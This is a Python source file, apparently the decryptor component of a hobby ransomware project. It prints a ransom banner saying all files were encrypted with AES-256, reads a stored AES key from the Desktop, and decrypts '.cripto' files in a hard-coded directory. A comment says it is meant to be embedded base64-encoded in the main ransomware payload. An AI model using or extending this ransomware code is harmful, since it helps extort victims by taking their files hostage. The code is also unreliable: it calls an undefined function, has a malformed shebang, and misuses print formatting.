#!/bin/bash/env python
# coding=UTF-8
# by Tarcisio marinho
# github.com/tarcisio-marinho
import os, socket
from AES import *
from RSA import *
from SRSA import *

BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'

# it have to be compiled and  saved as base64encoded in the main.py.

skull = '''
   .o oOOOOOOOo                                            OOOo
    Ob.OOOOOOOo  OOOo.      oOOo.                      .adOOOOOOO
    OboO"""""""""""".OOo. .oOOOOOo.    OOOo.oOOOOOo.."""""""""'OO
    OOP.oOOOOOOOOOOO "POOOOOOOOOOOo.   `"OOOOOOOOOP,OOOOOOOOOOOB'
    `O'OOOO'     `OOOOo"OOOOOOOOOOO` .adOOOOOOOOO"oOOO'    `OOOOo
    .OOOO'            `OOOOOOOOOOOOOOOOOOOOOOOOOO'            `OO
    OOOOO                 '"OOOOOOOOOOOOOOOO"`                oOO
   oOOOOOba.                .adOOOOOOOOOOba               .adOOOOo.
  oOOOOOOOOOOOOOba.    .adOOOOOOOOOO@^OOOOOOOba.     .adOOOOOOOOOOOO
 OOOOOOOOOOOOOOOOO.OOOOOOOOOOOOOO"`  '"OOOOOOOOOOOOO.OOOOOOOOOOOOOO
 "OOOO"       "YOoOOOOMOIONODOO"`  .   '"OOROAOPOEOOOoOY"     "OOO"
    Y           'OOOOOOOOOOOOOO: .oOOo. :OOOOOOOOOOO?'         :`
    :            .oO%OOOOOOOOOOo.OOOOOO.oOOOOOOOOOOOO?         .
    .            oOOP"%OOOOOOOOoOOOOOOO?oOOOOO?OOOO"OOo
                 '%o  OOOO"%OOOO%"%OOOOO"OOOOOO"OOO':
                      `$"  `OOOO' `O"Y ' `OOOO'  o             .
    .                  .     OP"          : o     .
                              :
                              .

        \33[93mTODOS OS SEUS ARQUIVOS FORAM CRIPTOGRAFADOS COM AES-256
'''

def decrypt_all():
    caminho = os.path.expanduser('~')+'/Desktop/'
    caminho2 = os.path.expanduser('~')+'/Área\ de\ Trabalho/'
    if(os.path.isdir(caminho)):
        caminho_correto = caminho
    elif(os.path.isdir(caminho2)):
        caminho_correto = caminho2

    #SRSA_to_RSA()
    #print('[*] chave privada do cliente descriptografada')
    #RSA_to_AES()
    #print('[*] chave AES descriptografada')
    f = open(caminho_correto + 'AES.gnncry','r')
    chave_aes = f.read()
    decrypt(chave_aes, '/home/tarcisio/Desktop/testes/')


def decrypt(key, diretorio):
    files_to_decrypt = []
    for caminho, diretorio, arquivo in os.walk(diretorio):
        for arq in arquivo:
            file_found = os.path.join(caminho, arq)
            extensao = os.path.splitext(file_found)
            if(extensao[1] == '.cripto'):
                files_to_decrypt.append(file_found)


    for e in files_to_decrypt:
        descriptografa(key,e)

if __name__ == '__main__':
    os.system('clear')
    print('{0}'+skull+'{1}').format(RED,GREEN)
    try:
        inicia = raw_input('Press any key to Decrypt all your files')
    except:
        exit()
    decrypt_all()
